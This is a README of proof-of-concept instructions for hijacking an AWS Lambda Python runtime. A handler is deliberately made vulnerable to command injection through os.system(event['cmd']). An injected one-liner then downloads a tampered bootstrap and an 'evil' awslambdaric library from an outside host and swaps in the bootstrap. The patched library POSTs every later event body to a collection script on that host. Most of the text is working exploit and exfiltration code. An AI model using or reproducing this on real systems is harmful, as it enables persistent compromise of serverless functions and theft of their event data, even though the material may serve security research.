# Instructions for POC

- Create a new lambda with a python 3.12 runtime
- set timeout to > 4 seconds
- make it vuln:
```
import json
import os

def lambda_handler(event, context):
    # TODO implement
    return {
        'statusCode': 200,
        'body': os.system(event['cmd'])
    }
```



### test event to supply the lambda to execute the bootstrap swap:
```
{
  "cmd": "python3 -c \"import zipfile;import urllib3;import os;http = urllib3.PoolManager();r = http.request('GET', 'https://appointmentaid.com/bootstrap2.py');w = open('/tmp/bootstrap.py', 'w');w.write(r.data.decode('utf-8'));w.close();r = http.request('GET', 'https://appointmentaid.com/awslambdaric-evil.zip');w = open('/tmp/evil.zip', 'wb');w.write(r.data);w.close();zipfile.ZipFile('/tmp/evil.zip', 'r').extractall('/tmp');r = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next');rid = r.headers['Lambda-Runtime-Aws-Request-Id'];http.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'});os.system('python3 /tmp/bootstrap.py')\""
}
```

After swapping the bootstrap all subsequent events will be leaked in a POST request to https://www.appointmentaid.com/postcatcher.php and can be viewed at https://www.appointmentaid.com/lambda.txt


### Explained
This POC works by editing the existing python 3.12 bootstrap.py file as well as the bootstrap.py file within the `awslambdaric` library itself. The following 3 lines are added to the bootstrap.py inside the `awslambdaric` library inside of the while loop:
```
import urllib3
http = urllib3.PoolManager()
http.request('post', 'https://www.appointmentaid.com/postcatcher.php', body=event_request.event_body)
```

In the main bootstrap.py file, this line is added near the top:
```
sys.path.insert(0, '/tmp')
```
The source code for postcatcher.php is included in the `php` folder in the root of this repo.

The modified `awslambdaric` library is zipped up and hosted along with the `bootstrap.py` file. The "exploit event" is a python one liner that downloads the `bootstrap.py` and the `awslambdaric` zip file. It unzips the zipped library into tmp along with the bootstrap file and then replaces the running bootstrap with the bootstrap.py from /tmp using our modified library.

The one liner code in a more readable format:
```python3
import zipfile
import urllib3
import os

#download new bootstrap.py file and save it to /tmp
http = urllib3.PoolManager()
r = http.request('GET', 'https://appointmentaid.com/bootstrap2.py')
w = open('/tmp/bootstrap.py', 'w')
w.write(r.data.decode('utf-8'))
w.close()

#download new awslambdaric and save it to /tmp
r = http.request('GET', 'https://appointmentaid.com/awslambdaric-evil.zip')
w = open('/tmp/evil.zip', 'wb')
w.write(r.data)
w.close()

#unzip new awslambdaric library to tmp
zipfile.ZipFile('/tmp/evil.zip', 'r').extractall('/tmp')

#tell lambda api this invocation is done
r = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
rid = r.headers['Lambda-Runtime-Aws-Request-Id']
http.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'})

#run the new evil bootstrap
os.system('python3 /tmp/bootstrap.py')
```
